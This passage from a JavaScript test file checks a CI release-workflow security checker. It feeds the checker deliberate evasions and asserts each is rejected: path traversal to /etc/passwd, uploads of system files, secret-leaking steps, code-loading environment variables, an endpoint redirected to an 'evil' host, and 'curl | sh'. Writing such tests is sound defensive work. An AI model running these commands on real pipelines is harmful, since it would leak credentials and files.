	["a glob", "artifacts/*"],
	["a brace expansion", "artifacts/{x,y}"],
	["a variable", "artifacts/$name"],
	["a command substitution", "artifacts/$(cat /tmp/n)"],
];

test("an upload source must be a plainly spelled path inside a downloaded artifact directory (round 5, finding 3)", () => {
	const directories = ["artifacts", "manifest"];
	for (const [label, source] of SOURCE_PATH_EVASIONS) {
		assert.equal(isArtifactPath(source, directories), false, label);
		const script = `aws s3 cp "${source}" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"`;
		const { reasons } = r2StepReasons("publish-r2", script, { artifactDirectories: directories });
		assert.ok(reasons.some((reason) => /uploads something other than a downloaded artifact/.test(reason)), `${label}: got:\n${reasons.join("\n")}`);
	}
	for (const fine of ["artifacts/x", "artifacts/SHA256SUMS", "artifacts/prime-agent-1.2.3.tgz", "manifest/github-assets.json", "artifacts/sub/x"]) {
		assert.equal(isArtifactPath(fine, directories), true, fine);
	}
	assert.equal(isArtifactPath("artifacts/x", []), false);
	// The loop form is held to the same rule: `for file in artifacts/../scripts/*` binds nothing.
	for (const glob of ["artifacts/../scripts/*", "artifacts/sub/../*", "artifacts/./*", "./artifacts/*", "artifacts//*", "/artifacts/*", "artifacts-evil/*"]) {
		const script = `for file in ${glob}; do name=$(basename "$file"); aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/\${name}" --endpoint-url "$R2_ENDPOINT_URL"; done`;
		const { reasons } = r2StepReasons("publish-r2", script, { artifactDirectories: directories });
		assert.ok(reasons.some((reason) => /uploads something other than a downloaded artifact/.test(reason)), `${glob}: got:\n${reasons.join("\n")}`);
	}
	// The workflow-level check reaches every publish job.
	for (const jobId of ["publish-r2", "publish-beta-r2", "finalize-release"]) {
		for (const [label, source] of SOURCE_PATH_EVASIONS) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a source", `set -euo pipefail\naws s3 cp "${source}" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && /uploads something other than a downloaded artifact|names a configuration or credential file/.test(problem)), `${label} in ${jobId}:\n${problems.join("\n")}`);
		}
	}
});

test("the beta SHA256SUMS is signed and its bundle is verified and published next to it (round 5, finding 4)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	const sign = release.jobs[BETA_SIGNATURES.signJob];
	const publish = release.jobs[BETA_SIGNATURES.publishJob];
	assert.match(String(sign.if), /needs\.context\.outputs\.publish_beta == 'true'/);
	assert.match(String(sign.if), /needs\.context\.outputs\.publish_production == 'true'/);
	assert.ok(sign.steps.some((step) => step.uses?.startsWith("actions/upload-artifact@") && step.with.name === BETA_SIGNATURES.artifact && String(step.with.path).endsWith(`/${BETA_SIGNATURES.bundle}`)));
	assert.ok(publish.needs.includes(BETA_SIGNATURES.signJob));
	assert.ok(publish.steps.some((step) => step.uses?.startsWith("actions/download-artifact@") && step.with.name === BETA_SIGNATURES.artifact && step.with.path === "artifacts"));
	const uploadStep = publish.steps.find((entry) => entry.name === BETA_SIGNATURES.uploadStep);
	assert.deepEqual(caseSkipPatternsOf(uploadStep.run), ["beta", "beta.json"]);
	assert.equal(casePatternMatches(uploadStep.run, BETA_SIGNATURES.bundle), false);
	assert.equal(casePatternMatches("case x in\n  *.sigstore.json) continue ;;\nesac", BETA_SIGNATURES.bundle), true);
	assert.equal(casePatternMatches("case x in\n  SHA256SUMS.*) exit 1 ;;\nesac", BETA_SIGNATURES.bundle), true);
	assert.equal(casePatternMatches("case x in\n  *.json) type=application/json ;;\nesac", BETA_SIGNATURES.bundle), false); // a content type, not a skip
	assert.equal(casePatternMatches("case x in\n  SHA256SUMS.sigstore.json)\n    echo skip\n    continue\n    ;;\nesac", BETA_SIGNATURES.bundle), true);
	assert.deepEqual(checkWorkflows(), []);

	const variants = [
		["sign not running for the beta", (text) => text.replace("if: github.event_name != 'pull_request' && (needs.context.outputs.publish_production == 'true' || needs.context.outputs.publish_beta == 'true')", "if: github.event_name != 'pull_request' && needs.context.outputs.publish_production == 'true'"), /'sign' must also run when needs\.context\.outputs\.publish_beta == 'true'/],
		["the beta bundle artifact renamed", (text) => text.replace("          name: release-beta-signatures\n          path: beta-signatures/SHA256SUMS.sigstore.json\n", "          name: release-beta-sigs\n          path: beta-signatures/SHA256SUMS.sigstore.json\n"), /'sign' must upload an artifact named 'release-beta-signatures'/],
		["the bundle missing from the artifact", (text) => text.replace("          path: beta-signatures/SHA256SUMS.sigstore.json\n", "          path: beta-signatures/other.json\n"), /artifact 'release-beta-signatures' must contain SHA256SUMS\.sigstore\.json/],
		["the beta sign step dropped", (text) => text.replace("          cosign sign-blob --yes \\\n            --bundle beta-signatures/SHA256SUMS.sigstore.json \\\n            beta-artifacts/SHA256SUMS\n", "          touch beta-signatures/SHA256SUMS.sigstore.json\n"), /'sign' must run 'cosign sign-blob --yes --bundle <dir>\/SHA256SUMS\.sigstore\.json beta-artifacts\/SHA256SUMS'/],
		["publish-beta-r2 not needing sign", (text) => text.replace("  publish-beta-r2:\n    name: Publish beta to R2\n    needs: [context, assemble, sign]\n", "  publish-beta-r2:\n    name: Publish beta to R2\n    needs: [context, assemble]\n"), /'publish-beta-r2' must need 'sign'/],
		["publish-beta-r2 not downloading the bundle", (text) => text.replace("      - name: Download beta signatures\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8\n        with:\n          name: release-beta-signatures\n          path: artifacts\n\n", ""), /'publish-beta-r2' must download 'release-final-beta' and 'release-beta-signatures' exactly once each/],
		["the bundle downloaded somewhere else", (text) => text.replace("          name: release-beta-signatures\n          path: artifacts\n", "          name: release-beta-signatures\n          path: signatures\n"), /must download 'release-beta-signatures' into the same directory as 'release-final-beta'/],
		["the bundle skipped by the upload loop", (text) => text.replace("            case \"$name\" in\n              beta|beta.json) continue ;;\n            esac\n            key=\"${prefix}/${name}\"", "            case \"$name\" in\n              beta|beta.json|*.sigstore.json) continue ;;\n            esac\n            key=\"${prefix}/${name}\""), /skips SHA256SUMS\.sigstore\.json/],
		["the bundle skipped by an exit", (text) => text.replace("            case \"$name\" in\n              beta|beta.json) continue ;;\n            esac\n            key=\"${prefix}/${name}\"", "            case \"$name\" in\n              beta|beta.json) continue ;;\n              SHA256SUMS.sigstore.json) echo no; exit 0 ;;\n            esac\n            key=\"${prefix}/${name}\""), /skips SHA256SUMS\.sigstore\.json/],
		["the verify step dropped", (text) => text.replace("          cosign verify-blob \\\n            --bundle artifacts/SHA256SUMS.sigstore.json \\\n            --certificate-oidc-issuer https://token.actions.githubusercontent.com \\\n            --certificate-identity \"https://github.com/${GITHUB_REPOSITORY}/.github/workflows/build-binaries.yml@refs/heads/${DEFAULT_BRANCH}\" \\\n            artifacts/SHA256SUMS\n", "          echo skipping verification\n"), /'publish-beta-r2' must run 'cosign verify-blob --bundle artifacts\/SHA256SUMS\.sigstore\.json/],
		["the verify identity loosened to any ref", (text) => text.replace('--certificate-identity "https://github.com/${GITHUB_REPOSITORY}/.github/workflows/build-binaries.yml@refs/heads/${DEFAULT_BRANCH}" \\\n            artifacts/SHA256SUMS', '--certificate-identity-regexp "https://github.com/${GITHUB_REPOSITORY}/.github/workflows/build-binaries.yml@.*" \\\n            artifacts/SHA256SUMS'), /'publish-beta-r2' must run 'cosign verify-blob/],
		["the verify identity pointing at the standalone workflow", (text) => text.replace('--certificate-identity "https://github.com/${GITHUB_REPOSITORY}/.github/workflows/build-binaries.yml@refs/heads/${DEFAULT_BRANCH}" \\\n            artifacts/SHA256SUMS', '--certificate-identity "https://github.com/${GITHUB_REPOSITORY}/.github/workflows/standalone-binaries.yml@refs/heads/${DEFAULT_BRANCH}" \\\n            artifacts/SHA256SUMS'), /'publish-beta-r2' must run 'cosign verify-blob/],
		["the verify issuer changed", (text) => text.replace("            --bundle artifacts/SHA256SUMS.sigstore.json \\\n            --certificate-oidc-issuer https://token.actions.githubusercontent.com \\", "            --bundle artifacts/SHA256SUMS.sigstore.json \\\n            --certificate-oidc-issuer https://accounts.google.com \\"), /'publish-beta-r2' must run 'cosign verify-blob/],
		["the verify step after the upload", (text) => {
			const start = text.indexOf("      - name: Verify the beta signature bundle against the pinned release identity\n");
			const end = text.indexOf("      - name: Upload immutable beta objects\n");
			const verify = text.slice(start, end);
			const anchor = "      - name: Check that this is still the head of the default branch\n";
			return `${text.slice(0, start)}${text.slice(end).replace(anchor, `${verify}${anchor}`)}`;
		}, /'publish-beta-r2' must verify the beta bundle before 'Upload immutable beta objects'/],
		["DEFAULT_BRANCH pointing elsewhere", (text) => text.replace("      BUILD_REF: ${{ needs.context.outputs.build_ref }}\n      DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}\n    steps:\n      # The nightly credential", "      BUILD_REF: ${{ needs.context.outputs.build_ref }}\n      DEFAULT_BRANCH: ${{ github.head_ref }}\n    steps:\n      # The nightly credential"), /'publish-beta-r2' must set DEFAULT_BRANCH to \$\{\{ github\.event\.repository\.default_branch \}\}/],
	];
	for (const [label, mutateText, pattern] of variants) {
		const broken = mutate(RELEASE, mutateText);
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => pattern.test(problem)), `${label}: expected ${pattern}, got:\n${problems.join("\n")}`);
	}
});

// ---------------------------------------------------------------------------------------------
// Review round 6. Each finding's exact evasion string is pinned here, whether the round-5 checker
// already rejected it or not, so a later refactor cannot quietly let one through again.
// ---------------------------------------------------------------------------------------------

/** Appends a whole job before `publish-r2`. */
function appendJob(text, jobYaml) {
	const anchor = "\n  publish-r2:\n";
	assert.ok(text.includes(anchor));
	return text.replace(anchor, `${jobYaml}\n  publish-r2:\n`);
}

const SNEAKY_JOB = `
  sneaky:
    name: Publish outside the ordering
    needs: [context, github-release]
    runs-on: ubuntu-latest
    permissions:
      contents: write
    env:
      GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}
      PRODUCTION_VERSION: \${{ needs.context.outputs.production_version }}
    steps:
      - name: Publish early
        run: |
          set -euo pipefail
          gh release edit "v\${PRODUCTION_VERSION}" --draft=false --latest
`;

test("every credential-bearing job is derived and must run in an environment; contents:write must sit in the ordering (round 6, finding 1)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	// The exemptions are exactly the three jobs the checker proves safe, and every other
	// credential-bearing job in the checked-in workflow declares an environment.
	assert.deepEqual(Object.keys(ENVIRONMENT_EXEMPT_JOBS).sort(), ["github-release", "github-release-beta", "sign"]);
	assert.deepEqual([...CONTENTS_WRITE_JOBS].sort(), ["finalize-release", "github-release", "github-release-beta"]);
	for (const [jobId, job] of Object.entries(release.jobs)) {
		if (job.uses) continue;
		if (isCredentialBearing(job) && !job.environment) assert.ok(ENVIRONMENT_EXEMPT_JOBS[jobId], `${jobId} holds a credential outside an environment without an exemption`);
		assert.deepEqual(credentialJobReasons(jobId, job, release.jobs), [], jobId);
	}
	// A new contents:write job that needs neither an environment nor verify: the reviewer's exact
	// scenario. Round 5 accepted it.
	const sneaky = mutate(RELEASE, (text) => appendJob(text, SNEAKY_JOB));
	const problems = checkWorkflows(reader({ [RELEASE]: sneaky }));
	assert.ok(problems.some((problem) => /job 'sneaky' holds contents:write .* without being one of github-release, finalize-release, github-release-beta or needing 'verify'/.test(problem)), problems.join("\n"));
	assert.ok(problems.some((problem) => /credential-bearing job 'sneaky' \(holds contents:write\) must run in a protected environment/.test(problem)), problems.join("\n"));
	// `needs: verify` satisfies the ordering rule but not the environment rule.
	const afterVerify = checkWorkflows(reader({ [RELEASE]: mutate(RELEASE, (text) => appendJob(text, SNEAKY_JOB.replace("needs: [context, github-release]", "needs: [context, verify]"))) }));
	assert.ok(!afterVerify.some((problem) => /job 'sneaky' holds contents:write/.test(problem)), afterVerify.join("\n"));
	assert.ok(afterVerify.some((problem) => /credential-bearing job 'sneaky' .* must run in a protected environment/.test(problem)), afterVerify.join("\n"));
	// An environment satisfies the environment rule but not the ordering rule.
	const inEnvironment = checkWorkflows(reader({ [RELEASE]: mutate(RELEASE, (text) => appendJob(text, SNEAKY_JOB.replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    environment: release-r2\n"))) }));
	assert.ok(inEnvironment.some((problem) => /job 'sneaky' holds contents:write/.test(problem)), inEnvironment.join("\n"));
	assert.ok(!inEnvironment.some((problem) => /must run in a protected environment/.test(problem) && problem.includes("'sneaky'")), inEnvironment.join("\n"));
	// Every other way of holding a credential is derived too: another write scope, write-all, a
	// non-GITHUB_TOKEN secret at step level (the job-level env check does not see it).
	for (const [label, edit] of [
		["id-token:write", (yaml) => yaml.replace("contents: write", "id-token: write")],
		["packages:write", (yaml) => yaml.replace("contents: write", "packages: write")],
		["write-all", (yaml) => yaml.replace("    permissions:\n      contents: write\n", "    permissions: write-all\n")],
		["a step-level secret", (yaml) => yaml.replace("contents: write", "contents: read").replace("      - name: Publish early\n        run: |", "      - name: Publish early\n        env:\n          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}\n        run: |")],
	]) {
		const broken = mutate(RELEASE, (text) => appendJob(text, edit(SNEAKY_JOB)));
		const found = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(found.some((problem) => /credential-bearing job 'sneaky' \(holds .*\) must run in a protected environment/.test(problem)), `${label}:\n${found.join("\n")}`);
	}
	assert.deepEqual(credentialJobReasons("x", { permissions: { contents: "read" }, steps: [] }), []);
	assert.deepEqual(credentialJobReasons("x", { permissions: { contents: "read" }, environment: "e", steps: [] }), []);
	assert.match(credentialJobReasons("x", { permissions: { contents: "write" }, environment: "e", steps: [] }).join("\n"), /holds contents:write/);
	assert.deepEqual(credentialJobReasons("x", { permissions: { contents: "write" }, environment: "e", needs: ["verify"], steps: [] }), []);
	assert.match(credentialJobReasons("x", { permissions: "write-all", environment: "e", steps: [] }).join("\n"), /holds contents:write/);
});

test("each environment exemption is proved, not trusted (round 6, finding 1)", () => {
	const variants = [
		// sign: OIDC only.
		["sign gains contents:write", (text) => text.replace("    permissions:\n      attestations: write\n      contents: read\n      id-token: write\n", "    permissions:\n      attestations: write\n      contents: write\n      id-token: write\n"), /job 'sign' may run without an environment only with exactly attestations: write, contents: read, id-token: write/],
		["sign gains a secret", (text) => text.replace("    steps:\n      - name: Download assembled production artifacts\n        if: env.PUBLISH_PRODUCTION == 'true'", "    steps:\n      - name: Leak\n        env:\n          X: ${{ secrets.NPM_TOKEN }}\n        run: echo\n      - name: Download assembled production artifacts\n        if: env.PUBLISH_PRODUCTION == 'true'"), /job 'sign' may run without an environment only while it references no secret other than GITHUB_TOKEN/],
		// github-release: drafts only.
		["github-release edits to draft=false", (text) => text.replace('gh release edit "$TAG" --draft --target "$BUILD_REF" --notes-file notes/RELEASE_NOTES.md --title "$TAG"', 'gh release edit "$TAG" --draft=false --target "$BUILD_REF" --notes-file notes/RELEASE_NOTES.md --title "$TAG"'), /job 'github-release' may run without an environment only while (every release it creates or edits stays a draft|it never publishes a release)/],
		["github-release creates without --draft", (text) => text.replace('            gh release create "$TAG" \\\n              --draft \\\n', '            gh release create "$TAG" \\\n'), /job 'github-release' may run without an environment only while every release it creates or edits stays a draft/],
		["github-release marks latest", (text) => text.replace('gh release upload "$TAG" artifacts/* --clobber', 'gh release upload "$TAG" artifacts/* --clobber\n            gh release edit "$TAG" --draft --latest'), /job 'github-release' may run without an environment only while it never publishes a release/],
		["github-release writes through gh api", (text) => appendStep(text, "github-release", runStep("Tag early", 'gh api --method POST "repos/${GITHUB_REPOSITORY}/git/refs" -f ref=refs/tags/x -f sha=$BUILD_REF')), /job 'github-release' may run without an environment only while gh api never writes/],
		["github-release writes through gh api -X", (text) => appendStep(text, "github-release", runStep("Tag early", 'gh api -X PATCH "repos/${GITHUB_REPOSITORY}/releases/1" -F draft=false')), /job 'github-release' may run without an environment only while gh api never writes/],
		["github-release runs git", (text) => appendStep(text, "github-release", runStep("Push", 'git -C artifacts push origin HEAD:refs/tags/x')), /job 'github-release' may run without an environment only while it never runs git/],
		["github-release deletes a release", (text) => appendStep(text, "github-release", runStep("Delete", 'gh release delete "$TAG" --yes')), /job 'github-release' may run without an environment only while it never deletes a release/],
		["github-release gains a secret", (text) => text.replace("      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout: this job publishes artifacts, it does not run repository code.\n      - name: Download assembled production artifacts", "      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout: this job publishes artifacts, it does not run repository code.\n      - name: Leak\n        env:\n          X: ${{ secrets.R2_BUCKET }}\n        run: echo\n      - name: Download assembled production artifacts"), /job 'github-release' may run without an environment only while it references no secret other than GITHUB_TOKEN/],
		// github-release-beta: gated by the beta environment.
		["github-release-beta no longer needs publish-beta-r2", (text) => text.replace("  github-release-beta:\n    name: Refresh the beta prerelease\n    needs: [context, publish-beta-r2]", "  github-release-beta:\n    name: Refresh the beta prerelease\n    needs: [context, sign]"), /job 'github-release-beta' may run without an environment only because it needs 'publish-beta-r2', which must run in one/],
		["publish-beta-r2 leaves its environment", (text) => text.replace("    environment:\n      name: nightly-r2\n", ""), /job 'github-release-beta' may run without an environment only because it needs 'publish-beta-r2', which must run in one/],
	];
	for (const [label, edit, pattern] of variants) {
		const broken = mutate(RELEASE, edit);
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => pattern.test(problem)), `${label}: expected ${pattern}, got:\n${problems.join("\n")}`);
	}
	// A draft edit with a literal `--draft` is what the checked-in job does and stays accepted.
	assert.deepEqual(credentialJobReasons("github-release", { permissions: { contents: "write" }, steps: [{ run: 'gh release edit "$TAG" --draft --title x\ngh release create "$TAG" --draft artifacts/*\ngh api repos/x/releases --paginate --jq .' }] }), []);
});

test("an assignment handed to a wrapper is an assignment (round 6, finding 2)", () => {
	const script = 'env PRODUCTION_VERSION=x aws s3 cp artifacts/a "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/a" --endpoint-url "$R2_ENDPOINT_URL"';
	// Two independent rules reject it: the wrapper is not allowlisted, and the R2 walk now sees the reassignment.
	assert.match(commandAllowlistReasons([...shellCommands(script)][0], { jobId: "publish-r2" }).join("\n"), /runs env, a wrapper/);
	assert.match(r2StepReasons("publish-r2", script, { artifactDirectories: ["artifacts"] }).reasons.join("\n"), /reassigns PRODUCTION_VERSION/);
	for (const [wrapped, pattern] of [
		["sudo -E R2_BUCKET=other aws s3 ls --endpoint-url \"$R2_ENDPOINT_URL\" s3://x", /reassigns R2_BUCKET/],
		["env -i NODE_OPTIONS=--import=/tmp/x.mjs node -e 1", /sets NODE_OPTIONS, which loads code/],
		["nice -n 5 BASH_ENV=/tmp/x.sh bash -c 1", /sets BASH_ENV, which loads code/],
	]) {
		const command = [...shellCommands(wrapped)][0];
		assert.match([...repositoryCodeReasons(command), ...r2StepReasons("publish-r2", wrapped, { artifactDirectories: ["artifacts"] }).reasons].join("\n"), pattern, wrapped);
	}
	const problems = checkWorkflows(reader({ [RELEASE]: mutate(RELEASE, (text) => appendStep(text, "publish-r2", runStep("Sneak in a prefix", `set -euo pipefail\n${script}`))) }));
	assert.ok(problems.some((problem) => problem.includes("'publish-r2'") && /runs env, a wrapper/.test(problem)), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.includes("'publish-r2'") && /reassigns PRODUCTION_VERSION/.test(problem)), problems.join("\n"));
});

test("a . or .. segment is refused in every position of a credential-bearing step (round 6, finding 3)", () => {
	const directories = ["artifacts", "notes"];
	assert.equal(isArtifactPath("artifacts/../../etc/passwd", directories), false);
	for (const evasion of ["artifacts/../../etc/passwd", "../x", "a/../b", "artifacts/./x", "./artifacts/x", "x=artifacts/../y", "key=@../x", "a:../b", "notes/.."]) {
		assert.equal(hasDotSegment(evasion), true, evasion);
	}
	for (const fine of ["artifacts/x", "artifacts/SHA256SUMS.sigstore.json", ".isDraft", "--jq", ".[] | .id", "/tmp/head.err", "https://x/../y", '^[[:space:]]*version "${PRODUCTION_VERSION//./\\.}"', "s|/releases/v[0-9][^/\"]*/|/x/|g", "..x", "x..", "a..b/c"]) {
		assert.equal(hasDotSegment(fine), false, fine);
	}
	const positions = [
		["cp source", 'aws s3 cp artifacts/../../etc/passwd "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/passwd" --endpoint-url "$R2_ENDPOINT_URL"'],
		["for file in", 'for file in artifacts/../../etc/*; do echo "$file"; done'],
		["test -f", "test -f artifacts/../../etc/passwd"],
		["sha256sum input", "sha256sum artifacts/../../etc/passwd"],
		["an assignment", "src=artifacts/../../etc/passwd"],
		["a redirection", "cat < artifacts/../../etc/passwd"],
		["--notes-file", 'gh release create "$TAG" --draft --notes-file artifacts/../../etc/passwd'],
		["--body-file", 'gh pr create --repo x --title t --body-file artifacts/../../etc/passwd'],
		["-F body=@file", 'gh api --method POST repos/x/releases -F body=@artifacts/../../etc/passwd'],
		["--input", "gh api --method POST repos/x/releases --input artifacts/../../etc/passwd"],
		["inside a substitution", 'digest=$(sha256sum artifacts/../../etc/passwd | cut -d" " -f1)'],
	];
	for (const [label, script] of positions) {
		const reasons = credentialStepReasons(script, { artifactDirectories: directories, jobId: "publish-r2" });
		assert.ok(reasons.some((reason) => /names a path with a \. or \.\. segment|redirects a path with a \. or \.\. segment/.test(reason)), `${label}: got:\n${reasons.join("\n")}`);
	}
	// The workflow-level check reaches every credential-bearing job.
	for (const jobId of ["publish-r2", "finalize-release", "publish-beta-r2", "github-release", "github-release-beta", "publish-npm", "tap-bump", "sign"]) {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a traversal", "set -euo pipefail\ntest -f artifacts/../../etc/passwd")));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && /names a path with a \. or \.\. segment/.test(problem)), `${jobId}:\n${problems.join("\n")}`);
	}
	// gh reads and sends files only from the downloaded artifacts or a literal /tmp file.
	for (const [label, script, pattern] of [
		["upload from /etc", 'gh release upload "$TAG" /etc/passwd', /gh release upload may only attach downloaded artifacts/],
		["upload from an expansion", 'gh release upload "$TAG" "$leak"', /gh release upload may only attach downloaded artifacts/],
		["upload from a glob outside", 'gh release upload "$TAG" /tmp/*', /gh release upload may only attach downloaded artifacts/],
		["create with an asset outside", 'gh release create "$TAG" --draft --title "$TAG" /tmp/leak', /gh release create may only attach downloaded artifacts/],
		["notes from /etc", 'gh release create "$TAG" --draft --notes-file /etc/passwd artifacts/*', /gh --notes-file must name a downloaded artifact/],
		["notes from an expansion", 'gh release edit "$TAG" --draft --notes-file "$f"', /gh --notes-file must name a downloaded artifact/],
		["--input from $HOME", 'gh api --method POST repos/x --input "$HOME/x"', /gh --input must name a downloaded artifact|names a configuration or credential file/],
		["--field=key=@file", "gh api --method POST repos/x --field=body=@/etc/passwd", /gh --field key=@file must name a downloaded artifact/],
		["an unknown release option", 'gh release create "$TAG" --draft --generate-notes-from /etc/passwd artifacts/*', /gh release create carries an option the checker does not know/],
		["an option built from an expansion", 'gh release create "$TAG" "--$flag" artifacts/*', /gh release create carries an option the checker does not know|gh option --\$flag is built from an expansion/],
		["release download", 'gh release download "$TAG" --dir artifacts', /gh release may only create, edit, upload, view, list here/],
	]) {
		const reasons = commandAllowlistReasons([...shellCommands(script)][0], { jobId: "github-release", artifactDirectories: directories });
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	for (const fine of [
		'gh release upload "$TAG" artifacts/* --clobber',
		'gh release create "$TAG" --draft --title "$TAG" --target "$BUILD_REF" --notes-file notes/RELEASE_NOTES.md artifacts/*',
		'gh release edit beta --title "Beta (v${BETA_VERSION})" --target "$BUILD_REF" --notes-file /tmp/beta-release-notes.md --prerelease',
		'gh release view "$TAG" --json isDraft,targetCommitish',
		'gh api --method POST "repos/${GITHUB_REPOSITORY}/git/refs" -f ref=refs/tags/x -f sha=$BUILD_REF',
	]) {
		assert.deepEqual(commandAllowlistReasons([...shellCommands(fine)][0], { jobId: "github-release-beta", artifactDirectories: directories }), [], fine);
	}
});

test("an expansion in command position is refused everywhere, and lifecycleReasons does not depend on the allowlist (round 6, finding 4)", () => {
	const build = { workflow: RELEASE, jobId: "build" };
	for (const script of ['manager=npm\n"$manager" ci', 'm=np; "${m}m" install', "$PM install", "`echo npm` ci", '"$(command -v npm)" ci']) {
		const reasons = [...shellCommands(script)].flatMap((command) => lifecycleReasons(command, build));
		assert.ok(reasons.some((reason) => /the command is a shell expansion, so the checker cannot tell whether it is a package manager/.test(reason)), `${script}: got:\n${reasons.join("\n")}`);
	}
	// ...in every job of both build workflows, credential-bearing or not.
	for (const [path, jobId] of [[RELEASE, "build"], [RELEASE, "assemble"], [RELEASE, "validate-macos"], [RELEASE, "pack-npm"], [RELEASE, "verify"], [RELEASE, "publish-npm"], [STANDALONE, "build"]]) {
		const broken = mutate(path, (text) => appendStep(text, jobId, runStep("Sneak in an install", 'manager=npm\n"$manager" ci')));
		const problems = checkWorkflows(reader({ [path]: broken }));
		assert.ok(problems.some((problem) => problem.startsWith(`${path}: job '${jobId}'`) && /the command is a shell expansion/.test(problem)), `${path} ${jobId}:\n${problems.join("\n")}`);
	}
	// Wrapper options that consume the next word no longer hide the package manager.
	for (const script of ["nice -n 10 npm ci", "sudo -u root npm install", "env -u FOO npm ci", "exec -a x npm ci", "coproc worker { npm ci; }", "sh -c 'npm ci'", "timeout -s KILL 10 npm ci", "stdbuf -o 0 npm ci", "sudo -Eu root npm ci"]) {
		const reasons = [...shellCommands(script)].flatMap((command) => [...lifecycleReasons(command, build), ...buildStepReasons(command, build)]);
		assert.ok(reasons.some((reason) => /npm (ci|install) runs dependency lifecycle scripts/.test(reason)), `${script}: got:\n${reasons.join("\n")}`);
	}
	assert.deepEqual([...shellCommands('PATH="$NPM_CONFIG_PREFIX/bin:$PATH" X=1 sh /tmp/prime-agent-npm12-install.sh "$SMOKE_VERSION"')].flatMap((command) => lifecycleReasons(command, build)), []);
});

test("the standalone workflow's top level is scanned like the release workflow's (round 6, finding 5)", () => {
	const header = "permissions:\n  contents: read\n\njobs:";
	const variants = [
		["a secret in env", `permissions:\n  contents: read\n\nenv:\n  NPM_TOKEN: \${{ secrets.NPM_TOKEN }}\n\njobs:`, /standalone-binaries\.yml: the workflow-level env NPM_TOKEN references a secret/],
		["a preload in env", `permissions:\n  contents: read\n\nenv:\n  NODE_OPTIONS: --import=/tmp/x.mjs\n\njobs:`, /standalone-binaries\.yml: the workflow-level env sets NODE_OPTIONS, which loads code before any command runs/],
		["a credential redirect in env", `permissions:\n  contents: read\n\nenv:\n  AWS_ENDPOINT_URL: https://evil\n\njobs:`, /standalone-binaries\.yml: the workflow-level env sets AWS_ENDPOINT_URL, which redirects/],
		["a secret in defaults", `permissions:\n  contents: read\n\ndefaults:\n  run:\n    shell: bash -c "\${{ secrets.X }}" {0}\n\njobs:`, /standalone-binaries\.yml: the workflow-level defaults reference a secret/],
		["a shell in defaults", `permissions:\n  contents: read\n\ndefaults:\n  run:\n    shell: python {0}\n\njobs:`, /standalone-binaries\.yml: the workflow-level defaults set shell 'python \{0\}'/],
	];
	for (const [label, replacement, pattern] of variants) {
		const broken = mutate(STANDALONE, (text) => text.replace(header, replacement));
		const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
		assert.ok(problems.some((problem) => pattern.test(problem)), `${label}: expected ${pattern}, got:\n${problems.join("\n")}`);
	}
	// The same shapes are still rejected in the release workflow.
	const release = mutate(RELEASE, (text) => text.replace("permissions: {}\n\njobs:", "permissions: {}\n\nenv:\n  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n\njobs:"));
	assert.ok(checkWorkflows(reader({ [RELEASE]: release })).some((problem) => /build-binaries\.yml: the workflow-level env NPM_TOKEN references a secret/.test(problem)));
});

test("a path-qualified interpreter or an expanded script argument is refused in build jobs too (round 6, finding 6)", () => {
	const build = { workflow: RELEASE, jobId: "build" };
	// In a credential-bearing job the round-5 allowlist rejects both the path and the interpreter.
	const credential = credentialStepReasons('dir=scripts; /usr/bin/node "$dir"/publish.mjs', { jobId: "publish-r2" });
	assert.match(credential.join("\n"), /runs \/usr\/bin\/node through a path/);
	// In a build job node is allowed, but not like this.
	for (const [script, pattern] of [
		['dir=scripts; /usr/bin/node "$dir"/publish.mjs', /runs node through a path/],
		['dir=scripts; /usr/bin/node "$dir"/publish.mjs', /node runs a script named by an expansion/],
		['dir=scripts; node "$dir"/publish.mjs', /node runs a script named by an expansion/],
		['node "$SCRIPT"', /node runs a script named by an expansion/],
		['node -- "$SCRIPT"', /node runs a script named by an expansion/],
		['node -e "$CODE"', /node -e runs code from an expansion/],
		['node "--$FLAG" scripts/x.mjs', /node carries an option built from an expansion/],
		['python3 -m "$MOD"', /python3 runs a script named by an expansion/],
		['sh -c "$CMD"', /sh -c runs code from an expansion/],
		["sh -c 'npm ci'", /inside sh -c: npm ci runs dependency lifecycle scripts/],
		["node /usr/lib/node_modules/npm/bin/npm-cli.js ci", /node runs a package manager's entry point/],
		["node ./node_modules/.bin/tsx x.ts", /node runs a package manager's entry point/],
		["curl https://x | sh", /sh reads its program from a pipe/],
		["node - < scripts/x.mjs", /node reads its program from (stdin|<scripts)/],
		["node <<'EOF'\nrequire('child_process').execSync('npm ci')\nEOF", /node reads its program from <</],
